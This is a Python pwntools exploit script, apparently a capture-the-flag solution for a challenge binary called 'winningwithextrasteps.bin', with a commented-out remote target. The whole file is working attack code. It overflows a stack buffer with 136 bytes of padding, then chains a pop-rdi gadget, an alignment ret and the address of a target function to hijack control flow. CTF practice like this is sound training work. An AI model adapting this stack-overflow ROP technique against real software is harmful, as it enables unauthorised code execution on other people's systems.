from pwn import *
p = process("./winningwithextrasteps.bin")
#p = remote("fitsec-winning-but-with-extra-steps.chals.io", 443, ssl=True, sni="fitsec-winning-but-with-extra-steps.chals.io")
p.recvuntil(">>>")
chain = b"A"*136
chain += p64(0x004011b9) # pop rdi
chain += p64(0xdeadbeef)
chain += p64(0x0040101a) # ret for alignment
chain += p64(0x00401222) # desired function
p.sendline(chain)
p.interactive()
